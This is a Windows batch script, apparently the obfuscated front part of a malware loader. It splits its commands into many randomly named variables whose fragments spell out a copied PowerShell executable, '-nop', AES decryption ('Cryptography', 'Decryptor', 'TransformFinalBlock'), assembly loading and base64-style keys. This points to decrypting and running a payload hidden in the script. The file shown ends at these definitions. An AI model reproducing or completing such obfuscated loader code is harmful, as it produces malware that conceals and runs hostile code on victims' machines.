@echo off
set "GRTxrZdEtE=we"
set "gAKRsoDquV=:\"
set "wAMijTWqRS= /"
set "gqZqtezBHl=0\"
set "ejQkfbQBsM=we"
set "WkdEKLcyPS=1."
set "irsbjmrZYM=ow"
set "IMFNPBifaI=po"
set "FZOaXWoNMp=Po"
set "qKTGElbdNn=in"
set "GPhseExXjO=\W"
set "lTfdxTUnyW=ll"
set "zBmWsOWCob= C"
set "GhtrAIUHKP=32"
set "QvxFPcdwqq=rs"
set "EVOuIySMFc=he"
set "HbjTNFvvFC=st"
set "xMOJimhfyV=xe"
set "MbQqaiYkSq=py"
set "oYjVunpZXN=.e"
set "CXyhOXzOkr=ll"
set "XFEfeCZdKi=rS"
set "WNwOOCOwfD=Wi"
set "KNKPVvHfos=ws"
set "FHQWtLfyiP=s\"
set "lPytXdWYOo=em"
set "KMViaMGBhB=nd"
set "CplYcBJfpy=y "
set "zSbKLjFpOj=he"
set "oTyzqfTGdp=co"
set "xHMDZzHSse=do"
set "sdMJuZuJVu=\v"
set "azwKqtFBRG=Sy"
set "GTcdiFMsrU= %~dp0"
set "DpoeEzDsRj=cd"
set "YrXBNtVYzb=W.Pa"
set "TlerKDvspu= '')"
set "VayCzOIirn=pStr"
set "PUWISDvIGP=onve"
set "OuIIEtRaaf=IaL "
set "baGhRISXUl=dB.D"
set "VQcALyxRek=ose("
set "ycMCXxKWka=stem"
set "tLiWyBVopk=.Dis"
set "NhKFqPxPeZ=rity"
set "dpPIJqbsyC=bqxW"
set "ouribTsVla='[-1"
set "iRPefLcDEN=tem."
set "cfTPwUntzs= New"
set "QYsJbdQofF=BC;$"
set "ENcqgUfYMM=.IO."
set "KnpxHwtlPR= = $"
set "RypCMEname=);$S"
set "iZfDvEwGJT=PVTg"
set "noyMSPymlr=oArr"
set "sJikgFIrvQ=ert]"
set "wyPkvaHqjc=n ''"
set "URpsoRxUmN=..-1"
set "nvYJICCOoY=Ka.T"
set "RsSjjXtOcn=ose("
set "iZFjmmZCAC=iXh "
set "NDWJMhRONX=('da"
set "kKfbQMypyo===')"
set "TQSiAYVkKe=pose"
set "oVWnMmTLhM=-joi"
set "PsNCdWtklw='oPV"
set "HkvEXurwol=rG, "
set "TgBpceDfVr=orF'"
set "HlrvNeBYSC=$hbQ"
set "bFyWnSXDDq=7kGw"
set "WJVnfOuHLV=XNzz"
set "MCgZIqWEAU=nirt"
set "YKtKtMJmEL=ptor"
set "AaoKLDiCcR=bqxW"
set "QPfKzwMWlb=y.Ci"
set "zDDiYZYQsY= if "
set "ymLYkMUaqC=th('"
set "dZgUkjPpof=form"
set "tWWSfsZZqp=-nop"
set "AQMHNJiyyC=esMa"
set "tQwKjIrWGZ=aL.T"
set "cIKjPepPgv=m(, "
set "ReGETSNIpv=.Key"
set "XQSNxOvPnZ=$kPV"
set "oTTvdesfKz=TllA"
set "iMWFzJGqEe=-1.."
set "sBqeqUemrB=h.Su"
set "eaQQnzmdGm=BGOs"
set "FoHjTZRrag=HO3I"
set "TPWmWVCral=bqxW"
set "OdcTIMXYmd=..-1"
set "YQyuhaxdPW=Obje"
set "ZmHpoFauQv=();$"
set "EEgoCnwQWT=::('"
set "ZpXoYWDgwM=R5jf"
set "QSOSlCvlHP=('ev"
set "YjyPuCUEKk=ptog"
set "MbpbkdlOUF=lit("
set "hIECiuNhXF=G = "
set "GHPCKXKlnZ=Sbqx"
set "EkPmXAUZVE=y]::"
set "RztjlTvrbI=Disp"
set "slpMGmfllR=ect "
set "qQbkVySkII=::De"
set "evBZkDtiAi=e = "
set "VTfTwzxvYK=Mode"
set "zSArZzaRVI=[Sys"
set "QBrWNlsJzb=urit"
set "AJQFxfomgi=dV1k"
set "RsCZRTbmyf=rans"
set "uUyNMhpkOr=bqxW"
set "CroeUBKHLX=kPVT"
set "kTntxxboRk=Syst"
set "VXktPnXksW=ct S"
set "hNmdbBnNVX=gMod"
set "xXbjfRgmou=Ka ="
set "reMpdOkDFz=ne);"
set "GdXpkDNlhk=Stre"
set "hWOcNitemo=embl"
set "csIcCNxJJz=S46e"
set "mrraHWVUkp=ecry"
set "AZYIvGzBIU=Wyqo"
set "nuOyNJbxnY=and "
set "aixPRwwlzs='txe"
set "wftCftDeAx=dojr"
